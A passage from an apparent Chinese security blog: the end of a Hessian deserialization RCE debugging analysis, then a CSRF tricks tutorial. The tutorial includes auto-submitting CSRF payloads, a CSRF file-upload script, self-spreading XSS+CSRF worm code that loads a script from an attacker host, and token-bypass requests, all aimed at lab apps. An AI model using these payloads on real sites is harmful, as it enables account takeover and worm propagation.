最后我们看下com.caucho.naming.QName类的toString()函数： 在toString()函数中，QName类的_context属性调用了composeName()函数。我们Gadget打进去后该属性类型为ContinuationDirContext，其中的cpe为CannotProceedException类实例，在调用到此处时会触发NamingException异常，此时会调用javax.naming.spi.NamingManager.getObjectFactoryFromReference()函数去加载Reference指定地址的服务，最后就是lookup()，从而导致RCE。 调试分析这里使用IDEA对Tomcat的war包进行远程调试。 由于在Windows本地运行的Tomcat，因此打开Tomcat的配置文件catalina.bat添加如下配置再重启Tomcat即可开启远程调试的端口： 1set CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5555&quot; 接着本地解压war包并用IDEA打开，然后使用Remote远程连接到Tomcat后，当显示”Connected to the target VM, address: ‘localhost:5555’, transport: ‘socket’”时表示成功，即可开始远程调试。 我们从配置文件web.xml开始看，这里有个URL的匹配路径/hessian，也就是刚刚我们访问的那个接口，可以看到其对应的是HessianServlet这个类： 跟进该类，直接在service()函数中下断点，然后浏览器再次访问http://127.0.0.1:8080/HessianTest/hessian页面即可停在断点处： 可以看到，这个接口需要POST方式来传数据，否则直接返回500。 重新发送payload，往下调试，看到会获取request请求中的输入流，然后调用invoke()函数： 跟下去，在invoke()函数中会调用相关函数读取头类型，并在下面的switch语句中匹配符合条件的头类型进入不同的逻辑，这里获取到的头类型是CALL_1_REPLY_2，则调用createHessianInput()函数创建Hessian输入流和输出流： 接着会判断序列化器工厂是否为空，这里为非空则设置到Hessian的输入流和输出流，然后调用invoke()： 跟进去这个invoke()函数，这里循环遍历读入header头，若header存在则调用Hessian输入流的readObject()，这里读取到了python脚本构造的名为test的Hessian头： 跟进去HessianInput.readObject()函数中，其中先获取tag值为77即’M’，然后匹配到对应的switch语句中调用readMap()函数： 跟进SerializerFactory.readMap()函数中，由于type为空且已经存在HashMap反序列化器，因此会调用MapDeserializer的readMap()函数继续解析序列化的Map内容： 跟进去MapDeserializer.readMap()函数，先新建一个HashMap实例，然后循环遍历HessianInput的内容，将其中的键值都进行readObject()操作然后再put进该新建的HashMap实例中： 这里readObject()处理过程也是一样的，简单地说就是获取序列化内容的类类型、属性值等（这里为反序列化获取com.caucho.naming.QName类及其属性值等，具体过程可自行调试下）。此处下断点然后F8过两次就能直接触发弹计算器了。 HashMap.put()函数中会调用hash(key)来计算对象的hash，然后再调用putVal()来设置HashMap的值： 这里hash(key)实际上就是调用的QName的hashCode()，在我本地调试的时候就出触发一次弹计算器（其实在获取了QName的_items属性后，只要在本地调试调用到QName的函数都会弹计算器，原因应该就是QName的_context属性中的cpe是个CannotProceedException类，会一直触发异常导致提前RCE）： 在第二次调用到HashMap.put()函数时，此时调用了XString的equals()函数： 在XString.equals()函数中，调用了QName.toString()函数： 调用到QName.toString()函数，这里才是真正的漏洞触发点，我们由前面知道marshalsec工具的Resin Gadget中QName类对象的_context属性的cpe是被设置为CannotProceedException类，该属性在调用composeName()函数时会捕获到NamingException异常，此时会调用javax.naming.spi.NamingManager的getContext()函数来查找另一个提供程序即恶意Reference来继续执行操作，从而触发RCE： 此时我们打开看下NamingException类实例即变量e中的stackTrace，验证了前面的分析，即QName.toString()中的漏洞点是在composeName()调用中，这里由于NamingException异常导致调用了NamingManager.getContext()来查找另一个程序继续执行，这其中有调用了NamingManager.getObjectFactoryFromReference()函数来加载payload中设置的恶意Reference地址指向的服务上的类，从而导致RCE： 此时的函数调用栈如下： 123456789101112131415161718192021222324252627282930313233toString:346, QName (com.caucho.naming)equals:392, XString (com.sun.org.apache.xpath.internal.objects)putVal:634, HashMap (java.util)put:611, HashMap (java.util)readMap:114, MapDeserializer (com.caucho.hessian.io)readMap:573, SerializerFactory (com.caucho.hessian.io)readObject:1160, HessianInput (com.caucho.hessian.io)invoke:240, HessianSkeleton (com.caucho.hessian.server)invoke:198, HessianSkeleton (com.caucho.hessian.server)invoke:425, HessianServlet (com.caucho.hessian.server)service:405, HessianServlet (com.caucho.hessian.server)internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)doFilter:166, ApplicationFilterChain (org.apache.catalina.core)doFilter:52, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)doFilter:166, ApplicationFilterChain (org.apache.catalina.core)invoke:199, StandardWrapperValve (org.apache.catalina.core)invoke:96, StandardContextValve (org.apache.catalina.core)invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)invoke:139, StandardHostValve (org.apache.catalina.core)invoke:81, ErrorReportValve (org.apache.catalina.valves)invoke:678, AbstractAccessLogValve (org.apache.catalina.valves)invoke:87, StandardEngineValve (org.apache.catalina.core)service:343, CoyoteAdapter (org.apache.catalina.connector)service:609, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:810, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1623, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1142, ThreadPoolExecutor (java.util.concurrent)run:617, ThreadPoolExecutor$Worker (java.util.concurrent)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang) 0x03 参考Hessian反序列化RCE漏洞复现及分析 SOFA-Hessian反序列漏洞 Java Unmarshalling Security - 攻击Hessian协议","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"CSRF Tricks小结","date":"2020-01-21T09:49:15.000Z","path":"2020/01/21/CSRF-Tricks小结/","text":"0x00 废话这里对CSRF漏洞的攻击利用技巧做了笔记小结，不定时补充。 0x01 CSRF并非必须点击才能攻击常规的CSRF的PoC如下，以DVWA的为例，通常是新建一个a标签让受害者点击： 1&lt;a href='http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'&gt;Click Me&lt;/a&gt; 而以BP生成的PoC则是用GET或POST的方式来提交表单，同样是需要受害者来点击提交的这个按钮才能触发CSRF攻击的： 1234567891011&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;form action=\"http://172.26.224.239/DVWA/vulnerabilities/captcha/\"&gt; &lt;input type=\"hidden\" name=\"password&amp;#95;new\" value=\"123456\" /&gt; &lt;input type=\"hidden\" name=\"password&amp;#95;conf\" value=\"123456\" /&gt; &lt;input type=\"hidden\" name=\"Change\" value=\"Change\" /&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 其实可以跳过用户点击按钮来触发CSRF攻击的这个步骤，只需要用户被诱使访问了恶意页面即可。当然，这种方法就是通过JavaScript来实现的。 a标签用的是click()方法： 123456&lt;a href='http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=mi1k7ea&amp;password_conf=mi1k7ea&amp;Change=Change#'&gt;Click Me&lt;/a&gt;&lt;!-- JS实现自动点击 --&gt;&lt;script&gt; var m = document.getElementsByTagName('a')[0]; m.click();&lt;/script&gt; form表单用的是submit()方法： 12345678910111213141516&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;form action=\"http://192.168.10.132/dvwa/vulnerabilities/csrf/\"&gt; &lt;input type=\"hidden\" name=\"password&amp;#95;new\" value=\"password\" /&gt; &lt;input type=\"hidden\" name=\"password&amp;#95;conf\" value=\"password\" /&gt; &lt;input type=\"hidden\" name=\"Change\" value=\"Change\" /&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;!-- JS实现自动点击 --&gt; &lt;script&gt; var m = document.getElementsByTagName('form')[0]; m.submit(); &lt;/script&gt;&lt;/html&gt; 0x02 利用iframe隐藏攻击过程一般的，CSRF攻击成功后就会自动跳转到已被CSRF攻击的目标页面中，此时容易被受害者发现。此时可以利用iframe标签来引入CSRF攻击页面，让CSRF攻击过程都不直接在页面中显现，一切都隐藏在页面中悄悄进行，不易被受害者发现。 隐藏iframe框可以使用HTML5的hidden属性或直接用iframe的height和width属性： 123&lt;iframe src=\"csrf.html\" hidden=\"hidden\"&gt;&lt;/iframe&gt;或&lt;iframe src=\"csrf.html\" height=\"0\" width=\"0\"&gt;hi&lt;/iframe&gt; 0x03 CSRF并非必需浏览器才能攻击一般针对Web服务的CSRF攻击，都是通过浏览器发起的，这是因为诱使受害者在浏览器中访问恶意页面时，浏览器会自动将已有的已登录站点的cookie自动带上去访问恶意页面中发起的表单请求。 但是CSRF并非只能通过浏览器这个媒介发起攻击的，它可利用自解压文件内的JavaScript等来攻击（当然，这是需要保存自本地的cookie才能成功）。 0x04 GET型CSRF利用方式多样化我们稍微观察下BP生成的CSRF PoC会发现，无论是GET或POST都是表单的形式来发起攻击的。POST没话说，必须得是表单才能提交数据。但GET就不一定了，它可以通过其他的一些标签或属性来发起CSRF攻击。 可利用的方式如下： &lt;a&gt;标签 &lt;img&gt;标签 &lt;script&gt;标签 &lt;iframe&gt;标签 &lt;link&gt;标签 CSS方法 JavaScript方法：Image对象、XMLHTTP对象 如前面BP生成的GET型CSRF攻击表单： 1234567891011&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;form action=\"http://172.26.224.239/DVWA/vulnerabilities/captcha/\"&gt; &lt;input type=\"hidden\" name=\"password&amp;#95;new\" value=\"123456\" /&gt; &lt;input type=\"hidden\" name=\"password&amp;#95;conf\" value=\"123456\" /&gt; &lt;input type=\"hidden\" name=\"Change\" value=\"Change\" /&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; a标签，如前面： 1&lt;a href='http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'&gt;Click Me&lt;/a&gt; img标签： 1&lt;img src='http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#' /&gt; iframe标签： 1&lt;iframe src='http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#' /&gt; script标签： 1&lt;script src='http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#' /&gt; link标签： 1&lt;link rel='stylesheet' href='http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'&gt; 通过CSS触发： 1*&#123;background: url('http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=mi1k7ea&amp;password_conf=mi1k7ea&amp;Change=Change#');&#125; 当然要通过标签引入该CSS文件： 1&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"csrf.css\"&gt; 0x05 CSRF+XSS漏洞组合拳CSRF+XSS这是最常见的前端漏洞组合拳。通常用于对漏洞的深度利用，或者是对防御的一种绕过利用，比如站点对CSRF漏洞设置了token机制来进行防御、但站点存在XSS漏洞可窃取CSRF token导致CSRF防御形同虚设，又如站点设置了HttpOnly限制XSS不能窃取用户cookie信息、但站点存在CSRF漏洞可被利用来进行其他的一些恶意表单操作。 生成一个随机Token是防御CSRF的经典方法之一。在页面涉及到表单时，会在服务器端生成一个Token，在页面加载时创建一个值为Token的input，插入到表单中，并设置type=”hidden“隐藏。当提交表单时，会将这个Token值一起提交。服务器端验证这个Token是否正确，如果不正确就会扔掉此次请求。本来只要获取目标页面Token的值，这种防御方法就会无效。但CSRF攻击是在其他网站发起的，由于同源策略，发起攻击的网站B不能读取被攻击的网站A的内容，只能够对其发送请求。因此攻击者是无法获取Token值的，CSRF攻击就此失效。但当目标网站有一个XSS漏洞时，我们便可以先发送一次请求，通过JS的跨域方法绕过同源策略，从而读取网站A页面中的Token值。再发送第二次请求，带上Token值，完成CSRF攻击。博主这里使用window.name来跨域窃取Token值。假如发起攻击的网站为B，受害站点为A。 1.在A网站的URL中构造XSS payload，实现以下功能： 获取本页面的Token值 将Token值赋值给window.name 2.在B网站中插入实现以下功能的JS： 创建一个iframe，并将iframe.src设为上面构造好的带有XSS payload的A网站的URL 写一个function，首先将iframe.contentWindow.location设为任意一个与B网站同源的页面，然后使window.name = iframe.contentWindow.name 修改iframe.contentWindow.location的原因是：当iframe中的页面为A网站的页面时，与B网站为不同源的，不能将iframe的window.name赋值给当前B网站窗口的window.name。但是我们把iframe中的页面换为与B网站同源的页面时，是可以进行window.name的赋值的。由于window.name的特性，其值本身与网站无关，是窗口的一个值。因此修改页面后window.name并未改变，我们就可以顺利取出了。 将这个iframe销毁 3.在B网站中插入真正的CSRF payload，带上已成功获取的window.name中的Token值，进行攻击。 案例：一次csrf配合xss的攻击实例 下面简单举例DVWA中XSS与CSRF漏洞的组合利用。 我们知道DVWA的CSRF的low级是无验证原密码就修改密码的，提交的是GET表单请求，payload如下： 1http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change# 在留言的地方即存储型XSS处，注入XSS的payload，内容为script标签，其中src属性值为CSRF攻击请求： 当其他用户访问到该留言内容时，就会被自动进行CSRF攻击篡改密码了： CSRF+Self-XSS对于Self-XSS，我们知道该类型的XSS漏洞是由用户自己输入给自己造成的攻击的一种XSS，很鸡肋。但如果Self-XSS和CSRF组合利用，则可以将漏洞影响面从用户自己本身扩展到了其他的用户，提高了漏洞的危害性。比如一个需登录站点存在一个Self-XSS，一般是用户自己才能自己搞自己，但是如果站点存在CSRF，则可以直接用来跨站伪造发起Self-XSS来窃取受害者的cookie信息。 一般来说，个人信息修改页面只有用户自己才能够看得到。假设网站A右上角的你好，用户这个地方存在XSS，并且在修改昵称为XSS payload后能够触发这个XSS。但是这个网站没有能够让其他用户看到你昵称的类似于留言板讨论区的地方，而管理员也一百年不会去看一下你的昵称，这个XSS就成为了一个鸡肋的SELF-XSS。因为普通用户怎么可能把昵称改成XSS payload来把Cookie送给你，你又没办法把自己的昵称改成恶意代码然后让别人看到，所以只能用来X自己。但如果同时这个网站有一个CSRF漏洞的话那就不一样了。我们可以通过以下操作来打任意用户的Cookie： 1.在恶意网站B中写入CSRF payload，使用这个CSRF来修改用户在A网站的昵称为XSS payload 2.诱惑用户访问恶意网站B，CSRF payload触发，用户在A网站的昵称被修改为XSS payload 3.用户重新访问A网站时，由于右上角显示了昵称，所以会触发对应的XSS payload，乖乖的把Cookie给你送过来 这样，一个SELF-XSS便被利用了。恶意网站B可以是我们自己建立的，也可以是某些存在XSS漏洞的大型网站，通常大型网站更容易受信任。这些大型网站可能本身设置了HTTP-ONLY导致攻击者无法拿到Cookie，又不好做其他操作。但是用来做攻击其他网站的跳板却是无法防范的。 CSRF+Self-XSS案例：鸡肋CSRF和Self-XSS组合的变废为宝 JSON CSRF+Self-XSS案例：一次XSS+CSRF的组合拳进攻(CSRF+JSON) 0x06 CSRF+文件上传漏洞组合拳我们知道，文件上传都是通过POST方式来上传的，而POST方式的CSRF只能通过表单的方式来发起攻击。这就存在一个问题，就是构造的表单提交的数据跟浏览器文件上传提交的数据会有所区别，即上传的请求会有一个filename的参数： 12345678-----------------------------70772515222937Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;phpinfo.php&quot;Content-Type: application/octet-stream&lt;?php phpinfo();?&gt;-----------------------------70772515222937 如果通过构造表单的方式实现文件上传，是没办法构造filename参数的，这是因为filename参数是由&lt;input&gt;标签自动生成的，是没办法通过表单来实现伪造的，从而能防御CSRF实现文件上传。 但自从HTML5出现后，有个叫CORS（跨域资源共享）的东西，让我们能够实现CSRF来上传文件。具体点说，就是利用JavaScript来对目标站点的上传点发起文件上传请求，这是因为CORS虽然不允许非法的外域读取本站点的资源、但并不阻止外域向本站发起请求，而CSRF刚刚好只是发起操作请求而非读取站点资源，这就构成了CSRF+文件上传漏洞的组合拳场景。 这种方式用BP就能生成： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;script&gt; function submitRequest() &#123; var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http:\\/\\/192.168.10.132\\/dvwa\\/vulnerabilities\\/upload\\/\", true); xhr.setRequestHeader(\"Accept\", \"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\"); xhr.setRequestHeader(\"Accept-Language\", \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\"); xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data; boundary=---------------------------30913605125121\"); xhr.withCredentials = true; var body = \"-----------------------------30913605125121\\r\\n\" + \"Content-Disposition: form-data; name=\\\"MAX_FILE_SIZE\\\"\\r\\n\" + \"\\r\\n\" + \"100000\\r\\n\" + \"-----------------------------30913605125121\\r\\n\" + \"Content-Disposition: form-data; name=\\\"uploaded\\\"; filename=\\\"phpinfo.php\\\"\\r\\n\" + \"Content-Type: application/octet-stream\\r\\n\" + \"\\r\\n\" + \"\\x3c?php\\r\\n\" + \" phpinfo();\\r\\n\" + \"?\\x3e\\r\\n\" + \"-----------------------------30913605125121\\r\\n\" + \"Content-Disposition: form-data; name=\\\"Upload\\\"\\r\\n\" + \"\\r\\n\" + \"Upload\\r\\n\" + \"-----------------------------30913605125121--\\r\\n\"; var aBody = new Uint8Array(body.length); for (var i = 0; i &lt; aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody])); &#125; &lt;/script&gt; &lt;form action=\"#\"&gt; &lt;input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 然后自己再添加下JS自动点击上传按钮，并用iframe标签来隐藏攻击过程即可。 csrf.html： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;script&gt; function submitRequest() &#123; var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http:\\/\\/192.168.10.132\\/dvwa\\/vulnerabilities\\/upload\\/\", true); xhr.setRequestHeader(\"Accept\", \"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\"); xhr.setRequestHeader(\"Accept-Language\", \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\"); xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data; boundary=---------------------------30913605125121\"); xhr.withCredentials = true; var body = \"-----------------------------30913605125121\\r\\n\" + \"Content-Disposition: form-data; name=\\\"MAX_FILE_SIZE\\\"\\r\\n\" + \"\\r\\n\" + \"100000\\r\\n\" + \"-----------------------------30913605125121\\r\\n\" + \"Content-Disposition: form-data; name=\\\"uploaded\\\"; filename=\\\"phpinfo.php\\\"\\r\\n\" + \"Content-Type: application/octet-stream\\r\\n\" + \"\\r\\n\" + \"\\x3c?php\\r\\n\" + \" phpinfo();\\r\\n\" + \"?\\x3e\\r\\n\" + \"-----------------------------30913605125121\\r\\n\" + \"Content-Disposition: form-data; name=\\\"Upload\\\"\\r\\n\" + \"\\r\\n\" + \"Upload\\r\\n\" + \"-----------------------------30913605125121--\\r\\n\"; var aBody = new Uint8Array(body.length); for (var i = 0; i &lt; aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody])); &#125; &lt;/script&gt; &lt;form action=\"#\"&gt; &lt;input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; var m = document.getElementsByTagName('form')[0]; m.submit(); &lt;/script&gt;&lt;/html&gt; csrf_iframe.html： 1&lt;iframe src=\"csrf.html\" hidden=\"hidden\"&gt;hi&lt;/iframe&gt; 诱使已登录的用户访问，成功实现CSRF上传文件： 0x07 CSRF蠕虫 其实CSRF蠕虫漏洞本身还是一个CSRF漏洞，只不过基于漏洞的具体场景特殊性，一旦这个场景使得这个csrf具备了传播型，那么该漏洞就赋予了蠕虫性质。 其实，CSRF蠕虫并非必须和XSS组合才能触发，仅仅是CSRF漏洞也能发起蠕虫攻击，前提是该CSRF是可以控制发起的表单中的内容指向为该CSRF payload本身，导致循环触发。 比如一个提交帖子的表单操作存在CSRF漏洞，然而攻击者利用这个漏洞通过提交恶意表单来往帖子里的内容写入恶意的地址，该地址正是该CSRF漏洞的PoC，如此一来只要其他用户访问这个帖子的链接即可自动被CSRF攻击、以该用户身份新建一个一毛一样的帖子，然后就继续传染下去。 案例参考： 基于社交媒体的csrf蠕虫风暴探索 新浪另类CSRF蠕虫放大危害 经典的XSS+CSRF结合造成的蠕虫病毒式推广 分享一个jsonp劫持造成的新浪某社区CSRF蠕虫 Demo1——纯CSRF蠕虫下面我们以bWAPP的XSS - Stored (Blog)作为场景，因为这是一个博客留言的系统，适用于CSRF蠕虫的演示。 我们先新建一个alan用户，博客内容写上我们CSRF蠕虫payload的地址，这时所有用户都能查看： csrf_iframe.html为引用iframe隐藏CSRF攻击过程页面： 1&lt;iframe src=\"csrf.html\" hidden=\"hidden\"&gt;&lt;/iframe&gt; csrf.html，针对提交博客内容的表单请求发起CSRF攻击，博文内容指向csrf_iframe.html、这就形成了恶意的循环、造成CSRF蠕虫，这里JS自动点击提交： 12345678910111213141516&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action=\"http://192.168.10.133/bWAPP/xss_stored_1.php\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"entry\" value=\"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#95;iframe&amp;#46;html\" /&gt; &lt;input type=\"hidden\" name=\"blog\" value=\"submit\" /&gt; &lt;input type=\"hidden\" name=\"entry&amp;#95;add\" value=\"\" /&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; var m = document.getElementsByTagName('form')[0]; m.submit(); &lt;/script&gt;&lt;/html&gt; 当其他用户如bee登录博客系统，就能看到alan用户的发的博客是个链接，当bee用户点击访问时就会自动触发CSRF蠕虫攻击： 再回到Blog界面会看到，bee用户也发布了一样的博文，说明被成功CSRF蠕虫攻击： 如此下去，其他用户看到并访问即可继续感染CSRF蠕虫。 Demo2——XSS+CSRF组合蠕虫进一步的，如果站点还存在XSS漏洞，那么XSS+CSRF蠕虫的攻击将更为深入。 还是以前面的Blog系统为例，删除掉前面创建的博客内容。我们以新建alan用户登录并验证是否存在存储型XSS，提交博文内容为&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;： 编写csrf.html如下，对提交博文进行CSRF攻击： 12345678910111213141516&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form id=\"csrf\" action=\"http://192.168.10.133/bWAPP/xss_stored_1.php\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"entry\" value=\"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js\" /&gt; &lt;input type=\"hidden\" name=\"blog\" value=\"submit\" /&gt; &lt;input type=\"hidden\" name=\"entry&amp;#95;add\" value=\"\" /&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; var m = document.getElementById('csrf'); m.submit(); &lt;/script&gt;&lt;/html&gt; 这段HTML代码测试是OK的，问题在于我们要想XSS和CSRF进行组合利用，那就需要将这段内容转换为JavaScript代码的形式才能被script标签加载进来成功执行。这里可以使用XSS’OR工具来对这段HTML代码进行转换： 1document.writeln(\"&lt;html&gt;&lt;!--CSRF PoC-generated by Burp Suite Professional--&gt;&lt;body&gt;&lt;script&gt;history.pushState(\\'\\',\\'\\',\\'\\/\\')&lt;\\/script&gt;&lt;form id=\\\"csrf\\\"action=\\\"http:\\/\\/192.168.10.133\\/bWAPP\\/xss_stored_1.php\\\"method=\\\"POST\\\"&gt;&lt;input type=\\\"hidden\\\"name=\\\"entry\\\"value=\\\"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js\\\"\\/&gt;&lt;input type=\\\"hidden\\\"name=\\\"blog\\\"value=\\\"submit\\\"\\/&gt;&lt;input type=\\\"hidden\\\"name=\\\"entry&amp;#95;add\\\"value=\\\"\\\"\\/&gt;&lt;input type=\\\"submit\\\"value=\\\"Submit request\\\"\\/&gt;&lt;\\/form&gt;&lt;\\/body&gt;&lt;script&gt;var m=document.getElementById(\\'csrf\\');m.submit();&lt;\\/script&gt;&lt;\\/html&gt;\"); 这段JavaScript代码的实现很简单，直接将HTML代码内容放入document.writeln()函数中，直接将其写入当前HTML页面。 注意，前面这段实现CSRF攻击的HTML或JavaScript代码在提交表单新建博文时内容是填写的http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js而非XSS payload。这里如果要修改为实现XSS+CSRF蠕虫的payload，由于博文内容需要填入尖括号&lt;&gt;，因此这种方式并不能提交。 下面我们换种写法，利用JavaScript来创建表单和输入项再提交，csrf2.js： 1234567891011121314151617181920212223242526272829function new_form()&#123; var f = document.createElement(\"form\"); document.body.appendChild(f); f.method = \"post\"; return f;&#125;function create_elements(eForm, eName, eValue)&#123; var e = document.createElement(\"input\"); eForm.appendChild(e); e.type = 'hidden'; e.name = eName; if (!document.all) &#123; e.style.display = 'none'; &#125; else &#123; e.style.display = 'block'; e.style.width = '0px'; e.style.height = '0px'; &#125; e.value = eValue; return e;&#125;var _f = new_form();create_elements(_f, \"entry\", \"&lt;script src=\\\"http://192.168.10.1/csrf2.js\\\"&gt;&lt;/script&gt;\");create_elements(_f, \"blog\", \"submit\");create_elements(_f, \"entry_add\", \"\");_f.action = \"http://192.168.10.133/bWAPP/xss_stored_1.php\"_f.submit(); 将这段JS代码中的一个作为csrf2.js文件，删掉之前alan用户相关的博文，提交博文内容为&lt;script src=&quot;http://192.168.10.1/csrf2.js&quot;&gt;&lt;/script&gt;，即通过script标签直接引入CSRF攻击的JavaScript代码，之后会发现只要有用户访问了这个页面就会一直触发XSS+CSRF蠕虫攻击（因为这个Blog内容是直接显示在主页而无需点进去才能看到内容），每次被攻击的用户都会自动发布一个同样payload的博文继续往下传染蠕虫： 当其他用户访问就会自动感染蠕虫： 0x08 CSRF绕过技巧收集引自：绕过CSRF防御 所有的CSRF不管哪种CSRF防御措施部署，你都可以先尝试如下两件事：点击劫持和更改请求方法。 点击劫持在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。 更改请求方法另外值得一试的方法就是更改请求的方法。如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。 例如，如下请求： 123POST /change_passwordPOST body:new_password=qwerty 可以被改写成 1GET /change_password?new_password=qwerty CSRF token的防御措施因为一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。 删除token参数或发送空token不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。 例如，合法请求如下 123POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b 那么实施这种请求： 123POST /change_passwordPOST body:new_password=qwerty 或这种： 123POST /change_passwordPOST body:new_password=qwerty&amp;csrf_tok= 使用另一个session的CSRF token应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。 如果一个受害者的token是871caef0757a4ac9691aceb9aad8b65b，你自己的token是YOUR_TOKEN，那么你可以很容易获取到自己的token但很难获取到受害者的token。尝试在payload中提供自己的token来绕过CSRF防御。 换句话说，原本应该发送如下请求： 123POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b 但是改成发送这个请求： 123POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=YOUR_TOKEN Session固定有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。 如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。 这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。 session固定。这是一个可以让你控制受害者的cookie存储的攻击； 执行如下请求来实施CSRF攻击 1234POST /change_passwordCookie: CSRF_TOK=FAKE_TOKEN;POST body:new_password=qwerty &amp;csrf_tok=FAKE_TOKEN 